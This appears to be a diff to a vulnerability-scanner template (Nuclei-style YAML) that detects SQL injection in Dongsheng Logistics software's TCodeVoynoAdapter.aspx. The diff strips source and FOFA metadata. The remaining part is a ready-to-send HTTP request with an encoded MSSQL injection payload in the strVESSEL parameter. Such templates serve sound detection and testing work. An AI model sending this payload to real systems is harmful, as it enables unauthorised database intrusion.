@@ -3,14 +3,8 @@ info:
   name: 东胜物流软件TCodeVoynoAdapter存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5e61e57d566f92e9aa3494405b531887
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 5e61e57d566f92e9aa3494405b531887
-    fofa: + fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
 http:
 - raw:
   - 'GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1''%20AND%202523%20IN%20(SELECT%20(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT%20SUBSTRING((ISNULL(CAST((%20sys.fn_VarBinToHexStr(hashbytes(''MD5'',''hello'')))%20AS%20NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))%20AND%20''uKco''%3d''uKco HTTP/1.1
